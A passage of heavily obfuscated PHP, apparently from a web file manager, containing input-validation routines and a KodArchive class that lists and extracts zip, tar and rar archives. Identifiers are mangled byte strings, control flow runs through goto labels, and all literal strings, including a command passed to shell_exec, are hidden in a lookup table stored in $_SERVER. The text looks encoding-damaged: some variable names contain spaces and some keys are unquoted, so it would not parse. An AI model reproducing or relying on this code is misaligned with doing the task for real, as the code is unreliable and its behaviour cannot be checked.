$aˆ⁄µé“éº[1500]: $f”Î°ß„œ¬ = strcspn($cß§ë¨¿ÖÌ, $aˆ⁄µé“éº[1501], $Cπ≈É¶Ú¯É); if ($f”Î°ß„œ¬ > 0) { $Cπ≈É¶Ú¯É += $f”Î°ß„œ¬; return self::getRawObject($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É); } break; case $aˆ⁄µé“éº[8]: $c‘°¥õŸç‡ = $dÖ®µß®⁄≠; ++$Cπ≈É¶Ú¯É; $E•≈Œ±ÒÙ¢ = preg_match($aˆ⁄µé“éº[1502], substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 256), $C«Óœ™ÍÍº); if (1 == $E•≈Œ±ÒÙ¢) { $BıßõÔÔ´Í = $C«Óœ™ÍÍº[1]; $Cπ≈É¶Ú¯É += strlen($BıßõÔÔ´Í); } break; case $aˆ⁄µé“éº[245]: case $aˆ⁄µé“éº[814]: $c‘°¥õŸç‡ = $dÖ®µß®⁄≠; ++$Cπ≈É¶Ú¯É; $bÉëéœ∫∞å = $Cπ≈É¶Ú¯É; if ($aˆ⁄µé“éº[245] == $dÖ®µß®⁄≠) { $eòŸ≈Êõ—´ = 1; while ($eòŸ≈Êõ—´ > 0) { if (!isset($cß§ë¨¿ÖÌ[$bÉëéœ∫∞å])) { break; } $f¢°–Éˆœ‡ = $cß§ë¨¿ÖÌ[$bÉëéœ∫∞å]; switch ($f¢°–Éˆœ‡) { case $aˆ⁄µé“éº[96]: ++$bÉëéœ∫∞å; break; case $aˆ⁄µé“éº[245]: ++$eòŸ≈Êõ—´; break; case $aˆ⁄µé“éº[814]: --$eòŸ≈Êõ—´; break; } ++$bÉëéœ∫∞å; } $BıßõÔÔ´Í = substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, $bÉëéœ∫∞å - $Cπ≈É¶Ú¯É - 1); $Cπ≈É¶Ú¯É = $bÉëéœ∫∞å; } break; case $aˆ⁄µé“éº[154]: case $aˆ⁄µé“éº[468]: $c‘°¥õŸç‡ = $dÖ®µß®⁄≠; ++$Cπ≈É¶Ú¯É; if ($aˆ⁄µé“éº[154] == $dÖ®µß®⁄≠) { $BıßõÔÔ´Í = array(); do { $cﬁ’ñƒì¯· = $Cπ≈É¶Ú¯É; $AÑ≤∏‹òÖÂ = self::getRawObject($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É); $Cπ≈É¶Ú¯É = $AÑ≤∏‹òÖÂ[2]; $BıßõÔÔ´Í[] = $AÑ≤∏‹òÖÂ; } while ($aˆ⁄µé“éº[468] != $AÑ≤∏‹òÖÂ[0] && $Cπ≈É¶Ú¯É != $cﬁ’ñƒì¯·); array_pop($BıßõÔÔ´Í); } break; case $aˆ⁄µé“éº[923]: case $aˆ⁄µé“éº[926]: if (isset($cß§ë¨¿ÖÌ[$Cπ≈É¶Ú¯É + 1]) && $cß§ë¨¿ÖÌ[$Cπ≈É¶Ú¯É + 1] == $dÖ®µß®⁄≠) { $c‘°¥õŸç‡ = $dÖ®µß®⁄≠ . $dÖ®µß®⁄≠; $Cπ≈É¶Ú¯É += 2; if ($aˆ⁄µé“éº[923] == $dÖ®µß®⁄≠) { $BıßõÔÔ´Í = array(); do { $cﬁ’ñƒì¯· = $Cπ≈É¶Ú¯É; $AÑ≤∏‹òÖÂ = self::getRawObject($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É); $Cπ≈É¶Ú¯É = $AÑ≤∏‹òÖÂ[2]; $BıßõÔÔ´Í[] = $AÑ≤∏‹òÖÂ; } while ($aˆ⁄µé“éº[1503] != $AÑ≤∏‹òÖÂ[0] && $Cπ≈É¶Ú¯É != $cﬁ’ñƒì¯·); array_pop($BıßõÔÔ´Í); } } else { $c‘°¥õŸç‡ = $dÖ®µß®⁄≠; ++$Cπ≈É¶Ú¯É; $E•≈Œ±ÒÙ¢ = preg_match($aˆ⁄µé“éº[1504], substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É), $C«Óœ™ÍÍº); if ($aˆ⁄µé“éº[923] == $dÖ®µß®⁄≠ && 1 == $E•≈Œ±ÒÙ¢) { $BıßõÔÔ´Í = strtr($C«Óœ™ÍÍº[1], $aˆ⁄µé“éº[1505], $aˆ⁄µé“éº[33]); $Cπ≈É¶Ú¯É += \strlen($C«Óœ™ÍÍº[0]); } elseif (!1 !== ($F∞»™±≤¬— = strpos($cß§ë¨¿ÖÌ, $aˆ⁄µé“éº[926], $Cπ≈É¶Ú¯É))) { $Cπ≈É¶Ú¯É = $F∞»™±≤¬— + 1; } } break; default: if ($aˆ⁄µé“éº[1506] == substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 6)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1506]; $Cπ≈É¶Ú¯É += 6; } elseif ($aˆ⁄µé“éº[102] == substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 4)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[102]; $Cπ≈É¶Ú¯É += 4; $BıßõÔÔ´Í = $aˆ⁄µé“éº[102]; } elseif ($aˆ⁄µé“éº[1507] == substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 4)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1508]; $Cπ≈É¶Ú¯É += 4; $BıßõÔÔ´Í = $aˆ⁄µé“éº[1507]; } elseif ($aˆ⁄µé“éº[1509] == substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 5)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1508]; $Cπ≈É¶Ú¯É += 5; $BıßõÔÔ´Í = $aˆ⁄µé“éº[1509]; } elseif ($aˆ⁄µé“éº[999] == substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 6)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[999]; $Cπ≈É¶Ú¯É += 6; if (1 == preg_match($aˆ⁄µé“éº[1510], substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É), $C«Óœ™ÍÍº)) { $Cπ≈É¶Ú¯É += strlen($C«Óœ™ÍÍº[0]); $eŒøÿ£‚”Â = $aˆ⁄µé“éº[1511]; $E•≈Œ±ÒÙ¢ = preg_match($eŒøÿ£‚”Â, substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É), $C«Óœ™ÍÍº, PREG_OFFSET_CAPTURE); if (1 == $E•≈Œ±ÒÙ¢) { $BıßõÔÔ´Í = substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, $C«Óœ™ÍÍº[0][1]); $Cπ≈É¶Ú¯É += $C«Óœ™ÍÍº[1][1]; } } } elseif ($aˆ⁄µé“éº[1512] == substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 9)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1512]; $Cπ≈É¶Ú¯É += 9; } elseif (1 == preg_match($aˆ⁄µé“éº[1513], substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 33), $C«Óœ™ÍÍº)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1476]; $Cπ≈É¶Ú¯É += strlen($C«Óœ™ÍÍº[0]); $BıßõÔÔ´Í = intval($C«Óœ™ÍÍº[1]) . $aˆ⁄µé“éº[71] . intval($C«Óœ™ÍÍº[2]); } elseif (1 == preg_match($aˆ⁄µé“éº[1514], substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, 33), $C«Óœ™ÍÍº)) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1515]; $BıßõÔÔ´Í = intval($C«Óœ™ÍÍº[1]) . $aˆ⁄µé“éº[71] . intval($C«Óœ™ÍÍº[2]); $Cπ≈É¶Ú¯É += strlen($C«Óœ™ÍÍº[0]); } elseif (($a¡ÖñÎØπÏ = strspn($cß§ë¨¿ÖÌ, $aˆ⁄µé“éº[1516], $Cπ≈É¶Ú¯É)) > 0) { $c‘°¥õŸç‡ = $aˆ⁄µé“éº[1517]; $BıßõÔÔ´Í = substr($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É, $a¡ÖñÎØπÏ); $Cπ≈É¶Ú¯É += $a¡ÖñÎØπÏ; } break; } goto cÛØ∆ì·ºê; D≈∞éΩﬂæô: $aˆ⁄µé“éº =& $_SERVER[£¿ÌÙëü¡¯¯]; $c‘°¥õŸç‡ = $aˆ⁄µé“éº[33]; $BıßõÔÔ´Í = $aˆ⁄µé“éº[33]; goto DêÑ¶´¯…µ; A§¡«ﬂÿ∑ø: } } goto C—¥¨Êﬂ°; b€Î≤¥ãÜÁ: function beforeShutdown() { Hook::trigger($_SERVER[‚ﬁ][35]); } $_SERVER[$_SERVER[‚ﬁ][36]] = BASIC_PATH; $_SERVER[$_SERVER[‚ﬁ][37]] = LIB_DIR; goto bôä”¿âíˆ; Eìµõºñıê: if (!function_exists($_SERVER[£¿ÌÙëü¡¯¯][1784])) { function imagecreatefrombmp($eÈÖåÇ◊´µ) { return ImageGdBMP::load($eÈÖåÇ◊´µ); } } class Input { public static function getArray($f”öé∞¬ã⁄) { goto F⁄ˆì≥ÖÜπ; F⁄ˆì≥ÖÜπ: $F∑’÷∆Ñ€‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; global $in; $c…ô÷ÿÜÆã = array(); goto F„ï“ŒÆ´æ; F„ï“ŒÆ´æ: $AüÔÙ ¥•ó = array(); $EÌÙ∞¶Øà∞ = LNG($F∑’÷∆Ñ€‰[1785]); foreach ($f”öé∞¬ã⁄ as $aÈöÈà◊±è => $Dãåõà∞ç∏) { goto Bª®û·Á—Ë; f„ê∏ø‹÷: if (!array_key_exists($aÈöÈà◊±è, $in)) { if (array_key_exists($F∑’÷∆Ñ€‰[1788], $Dãåõà∞ç∏)) { if (!is_null($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1788]])) { $c…ô÷ÿÜÆã[$EìÈâ€üöä] = $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1788]]; } } else { if (isset($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1789]])) { $AüÔÙ ¥•ó[] = $AÙó†¡ ¡Û; } } continue; } if (isset($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1789]]) && $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1789]] == $F∑’÷∆Ñ€‰[279]) { $e◊§«Âˆ˘ó = json_decode($in[$aÈöÈà◊±è], !0); if (is_array($e◊§«Âˆ˘ó)) { $c…ô÷ÿÜÆã[$EìÈâ€üöä] = $e◊§«Âˆ˘ó; } else { if (array_key_exists($F∑’÷∆Ñ€‰[1788], $Dãåõà∞ç∏)) { if (!is_null($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1788]])) { $c…ô÷ÿÜÆã[$EìÈâ€üöä] = $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1788]]; } } else { $AüÔÙ ¥•ó[] = $AÙó†¡ ¡Û; } } continue; } $dúÇπÎÒï◊ = _get($Dãåõà∞ç∏, $F∑’÷∆Ñ€‰[985]); goto F‚¥Ñç±ô«; Bª®û·Á—Ë: $AÙó†¡ ¡Û = _get($Dãåõà∞ç∏, $F∑’÷∆Ñ€‰[1786], $EÌÙ∞¶Øà∞ . $F∑’÷∆Ñ€‰[878] . $aÈöÈà◊±è); $EìÈâ€üöä = $aÈöÈà◊±è; if (isset($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1787]]) && $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1787]]) { $EìÈâ€üöä = $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1787]]; } goto f„ê∏ø‹÷; F‚¥Ñç±ô«: if (isset($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1789]]) && !self::check($in[$aÈöÈà◊±è], $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1789]], $dúÇπÎÒï◊)) { if (array_key_exists($F∑’÷∆Ñ€‰[1788], $Dãåõà∞ç∏)) { if (!is_null($Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1788]])) { $c…ô÷ÿÜÆã[$EìÈâ€üöä] = $Dãåõà∞ç∏[$F∑’÷∆Ñ€‰[1788]]; } } else { $AüÔÙ ¥•ó[] = $AÙó†¡ ¡Û; } continue; } $c…ô÷ÿÜÆã[$EìÈâ€üöä] = $in[$aÈöÈà◊±è]; goto Aàõ®˜“õû; Aàõ®˜“õû: } goto Aß∑¶û∞ˆâ; Aß∑¶û∞ˆâ: if (count($AüÔÙ ¥•ó) > 0) { show_json(implode($F∑’÷∆Ñ€‰[1790], $AüÔÙ ¥•ó), !1); } return $c…ô÷ÿÜÆã; goto Cﬂ«ÁÖµı; Cﬂ«ÁÖµı: } public static function reg($Aãù¿ŒœÎ∞ = "\162\145\161\x75\x69\162\x65") { static $Aµ»ÀùñﬂØ = array("\162\145\161\165\151\x72\145" => "\x2e\53", "\156\x75\155\x62\145\x72" => "\134\x64\x2b", "\150\145\170" => "\x5b\60\x2d\x39\x41\55\106\141\x2d\x66\135\53", "\151\x6e\x74" => "\x5b\x2d\x5c\53\135\x3f\x5c\144\53", "\142\x6f\x6f\154" => "\x30\174\61", "\x66\x6c\157\x61\164" => "\133\x2d\x5c\53\x5d\77\x5c\x64\x2b\x28\x5c\56\x5c\144\53\x29\77", "\145\x6e\147\154\151\163\150" => "\133\101\x2d\132\141\55\172\40\135\53", "\143\150\151\156\145\163\145" => "\x5b\x5c\170\173\64\x65\x30\60\x7d\55\x5c\170\173\x39\146\x61\65\x7d\x5d\x2b", "\x68\141\163\x43\x68\x69\x6e\145\163\145" => "\57\x28\x5b\x5c\x78\x7b\64\x65\60\x30\x7d\55\134\170\173\71\x66\x61\65\175\x5d\x2b\51\57\x75", "\x65\155\141\x69\x6c" => "\x5c\167\x2b\50\133\x5c\56\134\55\135\134\167\53\x29\52\134\100\x5c\167\53\50\133\x5c\56\x5c\x2d\x5d\x5c\x77\x2b\51\x2a\x5c\x2e\134\x77\x2b", "\x70\x68\157\x6e\145" => "\x31\133\x33\55\71\135\x5c\144\x7b\71\x7d", "\x74\x65\x6c\x70\150\x6f\156\145" => "\50\x5c\50\134\144\173\x33\54\64\175\134\x29\174\x5c\x64\173\63\x2c\x34\x7d\x2d\x7c\x5c\163\51\77\134\144\173\67\x2c\x31\64\175", "\165\162\x6c" => "\50\x68\164\x74\160\x7c\x66\x74\160\x7c\150\x74\164\160\x73\51\72\134\57\134\x2f\x5b\x5c\x77\134\x2d\x5f\135\53\x28\x5c\56\133\x5c\167\x5c\x2d\x5f\135\53\x29\53\x28\133\x5c\x77\x5c\55\134\56\x2c\x40\77\x5e\x3d\x25\x26\72\134\x2f\176\134\53\x23\135\52\x5b\134\x77\134\x2d\134\x40\77\x5e\x3d\x25\x26\x5c\57\176\134\53\43\135\51\x3f", "\x75\x72\x6c\x46\165\x6c\x6c" => "\133\x61\55\172\101\55\172\x5d\53\72\134\57\x5c\57\x5b\136\134\x73\x5d\52", "\151\x70" => "\x28\x5c\x64\173\x31\54\63\175\134\x2e\51\173\63\x7d\50\134\x64\173\61\x2c\x33\x7d\x29", "\x7a\x69\x70" => "\133\61\55\x39\135\134\144\x7b\x35\175\x28\77\x21\134\144\51", "\x69\144\x43\141\162\144" => "\50\x5c\144\x7b\61\x35\x7d\x29\174\50\x5c\144\173\61\67\x7d\x28\134\x64\x7c\130\x7c\170\x29\51", "\x63\x6f\x6c\x6f\162" => "\x23\50\133\60\55\x39\101\x2d\106\x61\55\146\135\x7b\x33\175\174\x5b\60\55\x39\x41\55\106\141\x2d\146\x5d\x7b\x36\x7d\51", "\164\x69\155\x65" => "\x28\x5b\60\x2d\61\135\x5c\144\174\x32\133\60\55\x34\x5d\51\72\x5b\x30\55\x35\135\134\144", "\144\x61\164\x65" => "\x5c\x64\173\64\175\133\55\x5c\57\135\77\50\60\x5b\x31\x2d\71\135\174\61\x5b\60\55\x32\x5d\51\x5b\55\134\57\x5d\x3f\50\x5b\60\55\62\x5d\x5c\x64\x7c\63\x5b\x30\x2d\61\135\x29", "\x64\x61\x74\145\124\151\x6d\x65" => "\x5c\x64\x7b\x34\x7d\x5b\x2d\x5c\57\135\77\x28\x30\133\x31\55\x39\x5d\174\61\133\60\x2d\x32\135\51\133\55\x5c\x2f\135\77\x28\x5b\x30\x2d\x32\x5d\x5c\144\174\63\x5b\60\x2d\61\x5d\x29\x5c\x73\53\x28\133\x30\x2d\61\135\134\144\x7c\x32\133\60\x2d\x34\135\x29\x3a\x5b\60\x2d\x35\135\x5c\x64", "\x70\141\x73\x73\167\x6f\x72\144" => "\x28\77\75\x2e\52\134\144\51\50\x3f\x3d\56\52\x5b\x61\55\172\x5d\x29\50\77\75\56\52\x5b\x41\55\132\135\x29\x2e\x7b\70\54\x32\60\175", "\x6b\145\171" => "\133\101\x2d\132\x61\x2d\172\60\x2d\x39\x5f\134\55\134\56\x5d\x2b", "\x6b\x65\171\x46\165\x6c\154" => "\x5b\x41\55\x5a\141\55\172\60\x2d\71\137\134\55\x5c\56\x5c\x73\54\x5d\x2b"); if (!$Aãù¿ŒœÎ∞) { return $Aµ»ÀùñﬂØ; } return $Aµ»ÀùñﬂØ[$Aãù¿ŒœÎ∞]; } public static function check($a•ƒáãú≥£, $CƒæÍ∂¥Üó, $D∆ÿåÒ”ÎÀ = null) { $b≠œ¥Àà≥É =& $_SERVER[£¿ÌÙëü¡¯¯]; switch ($CƒæÍ∂¥Üó) { case $b≠œ¥Àà≥É[7]: return in_array($a•ƒáãú≥£, $D∆ÿåÒ”ÎÀ); break; case $b≠œ¥Àà≥É[1791]: return floatval($a•ƒáãú≥£) > $D∆ÿåÒ”ÎÀ; break; case $b≠œ¥Àà≥É[1792]: return floatval($a•ƒáãú≥£) < $D∆ÿåÒ”ÎÀ; break; case $b≠œ¥Àà≥É[322]: return strlen($a•ƒáãú≥£) >= $D∆ÿåÒ”ÎÀ[0] && strlen($a•ƒáãú≥£) <= $D∆ÿåÒ”ÎÀ[1]; break; case $b≠œ¥Àà≥É[322]: if (is_array($D∆ÿåÒ”ÎÀ)) { return strlen($a•ƒáãú≥£) >= $D∆ÿåÒ”ÎÀ[0] && strlen($a•ƒáãú≥£) <= $D∆ÿåÒ”ÎÀ[1]; break; } else { return strlen($a•ƒáãú≥£) == $D∆ÿåÒ”ÎÀ; break; } case $b≠œ¥Àà≥É[318]: return floatval($a•ƒáãú≥£) >= $D∆ÿåÒ”ÎÀ[0] && floatval($a•ƒáãú≥£) <= $D∆ÿåÒ”ÎÀ[1]; break; } $e⁄ï—ÑêØ† = self::reg(!1); $CƒæÍ∂¥Üó = isset($e⁄ï—ÑêØ†[$CƒæÍ∂¥Üó]) ? $e⁄ï—ÑêØ†[$CƒæÍ∂¥Üó] : $CƒæÍ∂¥Üó; if (substr($CƒæÍ∂¥Üó, 0, 1) != $b≠œ¥Àà≥É[8]) { $CƒæÍ∂¥Üó = $b≠œ¥Àà≥É[1793] . $CƒæÍ∂¥Üó . $b≠œ¥Àà≥É[1794]; } return preg_match($CƒæÍ∂¥Üó, $a•ƒáãú≥£) === 1; } public static function get($cÙâõÆπ°é, $a¬ãÔﬂ˘ÔÑ = null, $b÷œñÎí”ë = null, $FàÇÛóﬂ≤ê = null) { goto fçﬂ…µ±Ì£; C™∆¿§›⁄ò: if (!is_null($FàÇÛóﬂ≤ê)) { $AçûêÚüµΩ[$eïâ≠‰ÿÖ„[985]] = $FàÇÛóﬂ≤ê; } if (!is_null($a¬ãÔﬂ˘ÔÑ)) { $AçûêÚüµΩ[$eïâ≠‰ÿÖ„[1789]] = $a¬ãÔﬂ˘ÔÑ; } $b∏Òç—Ÿù¶ = Input::getArray(array($cÙâõÆπ°é => $AçûêÚüµΩ)); goto B‡Œ•æ‡Ï¥; B‡Œ•æ‡Ï¥: return $b∏Òç—Ÿù¶[$cÙâõÆπ°é]; goto D¥≈ÌÈÖÑ¨; fçﬂ…µ±Ì£: $eïâ≠‰ÿÖ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AçûêÚüµΩ = array(); if (!is_null($b÷œñÎí”ë)) { $AçûêÚüµΩ[$eïâ≠‰ÿÖ„[34]] = $b÷œñÎí”ë; } goto C™∆¿§›⁄ò; D¥≈ÌÈÖÑ¨: } } class KodArchive { static function init() { goto Bö˜°π€ΩÏ; a√⁄π‡ ¯Ï: require_once ARCHIVE_LIB . $F´¿πÁä¬ñ[1803]; require_once ARCHIVE_LIB . $F´¿πÁä¬ñ[1804]; require_once ARCHIVE_LIB . $F´¿πÁä¬ñ[1805]; goto b≤Òéü∑∂“; eÿ—ÓΩıÓ¿: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $F´¿πÁä¬ñ[1801]; require_once ARCHIVE_LIB . $F´¿πÁä¬ñ[1802]; goto a√⁄π‡ ¯Ï; b≤Òéü∑∂“: require_once ARCHIVE_LIB . $F´¿πÁä¬ñ[1806]; goto B√ÏÛœü»µ; Bö˜°π€ΩÏ: $F´¿πÁä¬ñ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (defined($F´¿πÁä¬ñ[1795])) { return; } define($F´¿πÁä¬ñ[1795], SDK_DIR . $F´¿πÁä¬ñ[1796]); goto cè€Âƒï±Ù; cè€Âƒï±Ù: define($F´¿πÁä¬ñ[1797], TEMP_FILES); define($F´¿πÁä¬ñ[1798], TEMP_FILES); define($F´¿πÁä¬ñ[1799], $F´¿πÁä¬ñ[1800]); goto eÿ—ÓΩıÓ¿; B√ÏÛœü»µ: } static function checkIfType($AÏ´◊âûóÔ, $FÊÕ™ﬂìï) { goto EÛ≠ƒπ„¢Ø; eôØçÌŸ∑ı: $bÔ®´¥üŸÏ = in_array($AÏ´◊âûóÔ, $BÇ…÷ß∞Ù[$FÊÕ™ﬂìï]); if ($bÔ®´¥üŸÏ && ($FÊÕ™ﬂìï == $eïû¢î»Œö[298] || $FÊÕ™ﬂìï == $eïû¢î»Œö[1810]) && (!function_exists($eïû¢î»Œö[1818]) || !function_exists($eïû¢î»Œö[1819]))) { show_tips($eïû¢î»Œö[1820]); } if ($bÔ®´¥üŸÏ && $FÊÕ™ﬂìï == $eïû¢î»Œö[1020] && (!function_exists($eïû¢î»Œö[1821]) || !strstr(shell_exec($eïû¢î»Œö[1822]), $eïû¢î»Œö[1823]))) { show_tips($eïû¢î»Œö[1824]); } goto F‡ú†Ü—Âı; F‡ú†Ü—Âı: return $bÔ®´¥üŸÏ; goto c™± àŸÿ‘; EÛ≠ƒπ„¢Ø: $eïû¢î»Œö =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); $BÇ…÷ß∞Ù = array($eïû¢î»Œö[298] => array($eïû¢î»Œö[298], $eïû¢î»Œö[1807], $eïû¢î»Œö[1808], $eïû¢î»Œö[1809]), $eïû¢î»Œö[1810] => array($eïû¢î»Œö[1810], $eïû¢î»Œö[1811], $eïû¢î»Œö[1018], $eïû¢î»Œö[1016]), $eïû¢î»Œö[1020] => array($eïû¢î»Œö[1020], $eïû¢î»Œö[1812], $eïû¢î»Œö[1813], $eïû¢î»Œö[1814], $eïû¢î»Œö[1815], $eïû¢î»Œö[1816], $eïû¢î»Œö[1817])); goto eôØçÌŸ∑ı; c™± àŸÿ‘: } static function listContent($AÒÎàÖãëÕ, $E®π°¥À†ç = true) { $Cï≤…´±Çï =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); $FØé∞≥Õà∏ = !empty($GLOBALS[$Cï≤…´±Çï[1024]]) ? $GLOBALS[$Cï≤…´±Çï[1024]] : get_path_ext($AÒÎàÖãëÕ); $Föû¥‰¿‹Û = !1; if (self::checkIfType($FØé∞≥Õà∏, $Cï≤…´±Çï[1810])) { $d•∑ÑÖà¬Ë = PclTarList($AÒÎàÖãëÕ, $FØé∞≥Õà∏); $Föû¥‰¿‹Û = array(); for ($B‚ÂœÛ¯É§ = 0; $B‚ÂœÛ¯É§ < count($d•∑ÑÖà¬Ë); $B‚ÂœÛ¯É§++) { $bÁúÖ‹˘öı = $d•∑ÑÖà¬Ë[$B‚ÂœÛ¯É§]; if ($bÁúÖ‹˘öı[$Cï≤…´±Çï[1825]] == $Cï≤…´±Çï[1826] || $bÁúÖ‹˘öı[$Cï≤…´±Çï[1825]] == $Cï≤…´±Çï[1827]) { continue; } if ($E®π°¥À†ç) { $bÁúÖ‹˘öı[$Cï≤…´±Çï[1828]] = ltrim($bÁúÖ‹˘öı[$Cï≤…´±Çï[1828]], $Cï≤…´±Çï[1121]); } if ($bÁúÖ‹˘öı[$Cï≤…´±Çï[1825]] == $Cï≤…´±Çï[1829]) { $bÁúÖ‹˘öı[$Cï≤…´±Çï[77]] = !0; } else { $bÁúÖ‹˘öı[$Cï≤…´±Çï[77]] = !1; } $bÁúÖ‹˘öı[$Cï≤…´±Çï[1011]] = $B‚ÂœÛ¯É§; $Föû¥‰¿‹Û[] = $bÁúÖ‹˘öı; } } else { if (self::checkIfType($FØé∞≥Õà∏, $Cï≤…´±Çï[1020])) { $AîÙåŸ÷çÈ = kodRarArchive::listContent($AÒÎàÖãëÕ); if (!$AîÙåŸ÷çÈ[$Cï≤…´±Çï[1007]]) { return $AîÙåŸ÷çÈ; } else { $Föû¥‰¿‹Û = $AîÙåŸ÷çÈ[$Cï≤…´±Çï[1009]]; } } else { if (kodZipArchive::support($Cï≤…´±Çï[350])) { $Föû¥‰¿‹Û = kodZipArchive::listContent($AÒÎàÖãëÕ); } else { $B∑†¯øá≠¿ = new PclZip($AÒÎàÖãëÕ); $Föû¥‰¿‹Û = $B∑†¯øá≠¿->listContent(); } } } if ($Föû¥‰¿‹Û) { $Cà”¡îöÁÜ = unzip_charset_get($Föû¥‰¿‹Û); $E®π°¥À†ç = $E®π°¥À†ç && function_exists($Cï≤…´±Çï[66]); for ($B‚ÂœÛ¯É§ = 0; $B‚ÂœÛ¯É§ < count($Föû¥‰¿‹Û); $B‚ÂœÛ¯É§++) { $Föû¥‰¿‹Û[$B‚ÂœÛ¯É§][$Cï≤…´±Çï[1828]] = str_replace(array($Cï≤…´±Çï[1047], $Cï≤…´±Çï[1830]), $Cï≤…´±Çï[758], $Föû¥‰¿‹Û[$B‚ÂœÛ¯É§][$Cï≤…´±Çï[1828]]); if ($E®π°¥À†ç) { $Föû¥‰¿‹Û[$B‚ÂœÛ¯É§][$Cï≤…´±Çï[1828]] = iconv_to($Föû¥‰¿‹Û[$B‚ÂœÛ¯É§][$Cï≤…´±Çï[1828]], $Cà”¡îöÁÜ, $Cï≤…´±Çï[323]); unset($Föû¥‰¿‹Û[$B‚ÂœÛ¯É§][$Cï≤…´±Çï[1831]]); } } return array($Cï≤…´±Çï[1007] => !0, $Cï≤…´±Çï[1009] => $Föû¥‰¿‹Û); } else { return array($Cï≤…´±Çï[1007] => !1, $Cï≤…´±Çï[1009] => $Föû¥‰¿‹Û); } } static function extract($bãÒØ€ß¶Ç, $fÉµ·™∆çÔ, $Cüà∂Ï©ñ€ = "\x2d\x31", &$AÁ∏Çà§Êƒ = false) { goto aœ∏ïµ÷‚∑; aœ∏ïµ÷‚∑: $AÉëáë¬íó =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); $A∏ø’åıØ® = !empty($GLOBALS[$AÉëáë¬íó[1024]]) ? $GLOBALS[$AÉëáë¬íó[1024]] : get_path_ext($bãÒØ€ß¶Ç); goto bÆ•ﬁﬂﬁ¶≥; bÈ°ô‘ìÃè: if (self::checkIfType($A∏ø’åıØ®, $AÉëáë¬íó[1810])) { if ($Cüà∂Ï©ñ€ != $AÉëáë¬íó[1006]) { $F›Ñÿù•≤˘ = unzip_pre_name($F›Ñÿù•≤˘); $E£óáÌõÙÜ = unzip_pre_name($E£óáÌõÙÜ); $Eü®µíåÊœ = PclTarExtractList($bãÒØ€ß¶Ç, array($F›Ñÿù•≤˘), $fÉµ·™∆çÔ, $E£óáÌõÙÜ, $A∏ø’åıØ®); } else { $Eü®µíåÊœ = PclTarExtract($bãÒØ€ß¶Ç, $fÉµ·™∆çÔ, $AÉëáë¬íó[358], $A∏ø’åıØ®); } return array($AÉëáë¬íó[1007] => $Eü®µíåÊœ, $AÉëáë¬íó[1009] => PclErrorString(!0)); } else { if (self::checkIfType($A∏ø’åıØ®, $AÉëáë¬íó[1020])) { return kodRarArchive::extract($bãÒØ€ß¶Ç, $fÉµ·™∆çÔ, $A∏ø’åıØ®, $AÁ∏Çà§Êƒ); } else { if (kodZipArchive::support($AÉëáë¬íó[1832])) { return kodZipArchive::extract($bãÒØ€ß¶Ç, $fÉµ·™∆çÔ, $AÁ∏Çà§Êƒ); } else { $DÉäÎÖ◊√ë = new PclZip($bãÒØ€ß¶Ç); if ($Cüà∂Ï©ñ€ != $AÉëáë¬íó[1006]) { $Eü®µíåÊœ = $DÉäÎÖ◊√ë->extract(PCLZIP_OPT_PATH, $fÉµ·™∆çÔ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $AÉëáë¬íó[1833], PCLZIP_OPT_BY_NAME, $A·”ûÆå∫Ω[$AÉëáë¬íó[1828]], PCLZIP_OPT_REMOVE_PATH, $E£óáÌõÙÜ, PCLZIP_OPT_REPLACE_NEWER); } else { $Eü®µíåÊœ = $DÉäÎÖ◊√ë->extract(PCLZIP_OPT_PATH, $fÉµ·™∆çÔ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $AÉëáë¬íó[1833], PCLZIP_OPT_REPLACE_NEWER); } return array($AÉëáë¬íó[1007] => $Eü®µíåÊœ, $AÉëáë¬íó[1009] => 